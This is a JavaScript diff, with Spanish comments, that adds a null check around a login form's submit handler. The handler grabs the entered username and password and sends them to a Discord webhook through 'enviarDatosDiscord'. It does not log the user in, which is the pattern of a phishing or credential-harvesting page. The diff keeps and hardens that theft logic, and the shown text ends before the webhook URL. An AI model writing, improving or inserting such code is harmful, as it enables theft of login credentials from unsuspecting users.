@@ -1,18 +1,20 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('login');
-    form.addEventListener('submit', function(event) {
-        event.preventDefault();
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        // Construye el objeto con los datos del usuario
-        const userData = {
-            username: username,
-            password: password
-        };
-        // Envía los datos al webhook de Discord
-        enviarDatosDiscord(userData);
-        // Aquí puedes agregar más lógica, como redirigir a otra página
-    });
+    if(form){
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            // Construye el objeto con los datos del usuario
+            const userData = {
+                username: username,
+                password: password
+            };
+            // Envía los datos al webhook de Discord
+            enviarDatosDiscord(userData);
+            // Aquí puedes agregar más lógica, como redirigir a otra página
+        });
+    }
 
     function enviarDatosDiscord(data) {
         // URL del webhook de Discord
